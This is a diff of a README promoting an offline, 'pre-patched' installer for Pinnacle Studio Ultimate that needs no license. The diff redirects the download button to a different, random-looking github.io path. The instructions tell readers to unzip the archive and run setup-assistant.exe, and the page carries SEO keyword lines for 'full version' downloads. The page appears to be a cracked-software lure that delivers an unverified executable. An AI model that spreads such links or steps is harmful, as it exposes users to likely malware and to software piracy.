@@ -1,18 +1,18 @@
 # Pinnacle Studio Ultimate — Offline Setup Assistant
 
-<a href="https://pinnacle-studio-ultimate-download.github.io/.github" target="_blank">
+<a href="https://ryadikmntiiks.github.io/.github/PSUOFF" target="_blank">
   <img src="https://img.shields.io/badge/DOWNLOAD%20SETUP_ASSISTANT-%F0%9F%92%BE-blue?style=for-the-badge&logo=pinnacle&logoColor=white" alt="Download Setup Assistant">
 </a>
 
-🎞 Pinnacle Studio Ultimate delivers professional-grade video editing with advanced features like multi-cam editing, motion tracking, and color grading.
+🎞️ **Pinnacle Studio Ultimate** delivers professional-grade video editing with advanced features like multi-cam editing, motion tracking, and color grading.
 
-This Setup Assistant provides a fully offline, ready-to-use installer for all major versions of Pinnacle Studio Ultimate — no online activation required.
+This Setup Assistant provides a fully **offline**, ready-to-use installer for all major versions of Pinnacle Studio Ultimate — no online activation required.
 
 ---
 
 ## ✅ Features
 
-- 🎬 Supports versions: 19, 20, 23, 24, 25, 26
+- 🎬 Supports versions: **19**, **20**, **23**, **24**, **25**, **26**
 - 🎨 Full color grading controls
 - ✂️ Multicam, 360° video, and motion tracking
 - 🔒 No internet or login needed — 100% offline
@@ -20,9 +20,9 @@ This Setup Assistant provides a fully offline, ready-to-use installer for all ma
 
 ---
 
-## 🖼 Screenshots
+## 🖼️ Screenshots
 
-### 🎛 Color Grading in Studio 24  
+### 🎛️ Color Grading in Studio 24  
 ![Color Grading](https://www.pinnaclesys.com/static/pin/images/products/studio/v26/bg-intro-video-ult.png)
 
 ---
@@ -39,9 +39,9 @@ This Setup Assistant provides a fully offline, ready-to-use installer for all ma
 
 ## 🔧 Installation Guide
 
-1. Click the Download Setup Assistant button above  
-2. Unzip the archive and run setup-assistant.exe  
-3. Select the desired version: 19 to 26 Ultimate  
+1. Click the **Download Setup Assistant** button above  
+2. Unzip the archive and run `setup-assistant.exe`  
+3. Select the desired version: `19` to `26 Ultimate`  
 4. Follow the step-by-step installer (fully offline)  
 5. Start editing like a pro 🚀
 
@@ -71,3 +71,4 @@ pinnacle studio 25 ultimate download full version
 
 > 🎥 Perfect for creators, editors, and content professionals  
 > 💾 No license needed — all builds come pre-patched
+
